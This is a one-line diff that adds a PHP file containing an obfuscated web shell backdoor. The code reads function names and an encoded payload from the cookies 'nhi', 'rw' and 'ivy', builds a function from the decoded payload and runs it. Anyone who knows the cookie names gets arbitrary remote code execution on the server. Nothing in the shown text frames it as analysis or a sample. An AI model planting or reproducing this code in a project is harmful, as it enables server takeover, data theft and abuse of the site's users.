@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['nhi']){$hqb=$_COOKIE['nhi']("",@$_COOKIE['rw'](@$_COOKIE['ivy']));$hqb();}?>
